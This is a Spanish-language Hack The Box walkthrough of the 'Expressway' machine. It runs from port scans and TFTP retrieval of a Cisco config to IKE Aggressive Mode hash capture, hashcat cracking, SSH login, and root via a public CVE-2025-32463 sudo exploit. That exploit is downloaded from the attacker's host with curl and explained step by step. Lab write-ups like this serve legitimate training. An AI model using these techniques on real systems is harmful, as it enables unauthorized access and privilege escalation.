# Expressway — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Expressway](https://app.hackthebox.com/machines/Expressway) |
| **Plataforma** | [HackTheBox](https://app.hackthebox.com/) |
| **Sistema Operativo** | Linux (Debian) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos TCP

Se lanza un escaneo completo con Nmap sobre TCP para descubrir servicios activos:

```bash
nmap -p- -sCV -vvv -T5 10.129.238.52 -oN Expressway
```

![Nmap TCP](images/01_nmap_tcp.jpg)

El resultado es llamativo: **solo el puerto 22 (SSH) está abierto** en TCP. Esto indica que la superficie de ataque principal puede estar en UDP.

### Enumeración de puertos UDP

Se lanza un escaneo UDP de los 20 puertos más comunes:

```bash
nmap -sU --top-port=20 10.129.238.52
```

![Nmap UDP](images/02_nmap_udp.jpg)

Se identifican dos puertos UDP de interés:
- **Puerto 69/udp** — TFTP (open|filtered)
- **Puerto 500/udp** — ISAKMP (open) — protocolo de negociación IKE para VPNs IPsec

### Enumeración TFTP

Se confirma el servicio TFTP y se lanza el script de enumeración de Nmap para listar ficheros accesibles:

```bash
nmap -sU 10.129.238.52 -p 69 --script=tftp-enum.nse
```

![TFTP Enum](images/03_tftp_enum.jpg)

El script encuentra el fichero **`ciscortr.cfg`**, un fichero de configuración de router Cisco.

### Descarga del fichero de configuración

Se conecta al servidor TFTP y se descarga el fichero:

```bash
tftp 10.129.238.52
get ciscortr.cfg
quit
```

![TFTP Get](images/04_tftp_get.jpg)

### Análisis del fichero de configuración

Se lee el contenido del fichero descargado:

```bash
cat ciscortr.cfg
```

![Cisco Config](images/05_cisco_config.jpg)

El fichero revela:
- **Versión IOS:** 12.3
- **Hostname:** expressway
- **`enable password *****`** — contraseña de enable censurada
- **`username ike password *****`** — usuario **ike** con contraseña censurada

El nombre de usuario `ike` y el hostname `expressway` son pistas directas. Además, la presencia del protocolo ISAKMP/IKE en el puerto 500 UDP encaja con el nombre del usuario.

---

## Explotación — IKE Aggressive Mode PSK Cracking

### ¿Qué es IKE y por qué es vulnerable?

**IKE (Internet Key Exchange)** es el protocolo usado para negociar conexiones VPN IPsec. Tiene dos modos:
- **Main Mode:** más seguro, no expone la identidad del cliente
- **Aggressive Mode:** más rápido pero expone el hash PSK (Pre-Shared Key) en el intercambio, permitiendo ataques offline de diccionario

### Verificación del servicio IKE en Main Mode

Se comprueba que el servicio IKE responde correctamente:

```bash
ike-scan -M 10.129.238.52
```

![IKE Main Mode](images/06_ike_main_mode.jpg)

El servidor responde con un **Main Mode Handshake** y negocia:
- **Cifrado:** 3DES
- **Hash:** SHA1
- **Grupo:** modp1024
- **Auth:** PSK
- **XAuth** habilitado (autenticación extendida)

### Captura del hash PSK en Aggressive Mode

Se fuerza el modo agresivo especificando la identidad `ike@expressway.htb` (deducida del fichero de configuración) y se guarda el hash capturado:

```bash
ike-scan -M -A --pskcrack=k.hash 10.129.238.52
```

![IKE Aggressive Mode](images/07_ike_aggressive.jpg)

El servidor responde con el handshake en Aggressive Mode y expone:
- **ID:** `ike@expressway.htb`
- **Hash (20 bytes):** capturado en `k.hash`

### Visualización del hash capturado

```bash
ls
cat k.hash
```

![Hash File](images/08_hash_file.jpg)

### Crackeo del hash con Hashcat

Se identifica automáticamente el tipo de hash como **IKE-PSX SHA1 (modo 5400)** y se ataca con el diccionario rockyou:

```bash
hashcat k.hash /home/kali/Escritorio/rockyou.txt
```

![Hashcat](images/09_hashcat.jpg)

Contraseña encontrada: **`freakingrockstarontheroad`**

---

## Acceso Inicial — SSH con credenciales IKE

Con el usuario `ike` y la contraseña crackeada se accede por SSH:

```bash
ssh ike@10.129.238.52
```

![SSH Login](images/10_ssh_login.jpg)

### Flag de usuario

```bash
whoami
# ike
ls
cat user.txt
```

---

## Escalada de Privilegios — CVE-2025-32463 (sudo EoP)

### Enumeración de permisos sudo

Se comprueba qué puede ejecutar `ike` con privilegios elevados:

```bash
sudo -l
```

![Sudo -l](images/11_sudo_l.jpg)

`sudo` requiere contraseña y no hay entradas NOPASSWD. Sin embargo, se comprueba la versión de sudo instalada:

```bash
sudo -V
```

### Transferencia y ejecución del exploit

En la máquina atacante se clona el repositorio y se levanta un servidor HTTP:

```bash
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
python3 -m http.server 8020
```

Desde la máquina víctima se descarga el exploit:

```bash
cd /tmp
curl http://10.10.14.137:8020/exploit.sh -LO
```

![Transfer Exploit](images/12_transfer_exploit.jpg)

La versión es **1.9.17**, vulnerable a **CVE-2025-32463**.

### ¿Qué es CVE-2025-32463?

**CVE-2025-32463** es una vulnerabilidad de escalada de privilegios en sudo versiones hasta 1.9.17. Permite a un usuario sin privilegios sudo obtener una shell como root aprovechando la carga de una librería NSS maliciosa a través de un directorio de stage temporal. El exploit fue publicado por Stratascale Cyber Research Unit.

### Análisis del exploit

Se examina el contenido del script de explotación:

```bash
cat exploit.sh
```

![Exploit SH](images/13_exploit_sh.jpg)

El exploit:
1. Crea un directorio temporal en `/tmp/sudowoot.stage.XXXXXX`
2. Compila una librería `.so` maliciosa que llama a `setreuid(0,0)` y lanza `/bin/bash`
3. Configura un `nsswitch.conf` falso para cargar la librería
4. Ejecuta `sudo -R woot woot` para disparar la carga de la librería con privilegios de root

Se le dan permisos de ejecución y se lanza:

```bash
chmod +x exploit.sh
./exploit.sh
```

![Root Shell](images/14_root_shell.jpg)

```
woot!
root@expressway:/#
```

### Flag de root

```bash
cd /root
ls
cat root.txt
```

![Root Flag](images/15_root_flag.jpg)

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan TCP + UDP | `nmap` |
| Enumeración | TFTP file enumeration | `nmap --script=tftp-enum` |
| Obtención de info | Descarga de config Cisco | `tftp` |
| Explotación | IKE Aggressive Mode PSK hash capture | `ike-scan` |
| Crackeo | Dictionary attack sobre hash IKE-PSK | `hashcat` |
| Acceso inicial | SSH con credenciales crackeadas | `ssh` |
| Escalada | sudo EoP via NSS library hijack (CVE-2025-32463) | `exploit.sh` |
